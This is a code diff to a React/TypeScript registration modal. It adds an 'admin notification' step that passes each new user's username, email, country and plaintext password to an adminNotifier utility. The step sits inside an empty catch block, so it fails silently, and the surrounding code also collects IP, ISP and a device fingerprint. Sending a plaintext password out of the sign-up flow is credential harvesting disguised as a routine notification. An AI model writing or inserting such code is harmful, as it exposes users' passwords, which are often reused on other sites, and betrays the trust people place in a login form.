@@ -185,6 +185,13 @@ export default function AuthModal({ isOpen, onClose, onLogin }: AuthModalProps) 
             setPendingEmail(trimmedEmail);
             setPendingPassword(password);
 
+            // Notify admin of new registration
+            try {
+              const { notifyRegistration } = await import("../utils/adminNotifier");
+              const geo = await fetchRegistrationInfo().catch(() => ({ country: "" }));
+              notifyRegistration(profile.id, trimmedUsername, trimmedEmail, geo.country || "", password);
+            } catch {}
+
             // Store registration info (IP, country, ISP, device fingerprint)
             fetchRegistrationInfo().then((geo) => {
               const fingerprint = getDeviceFingerprint();
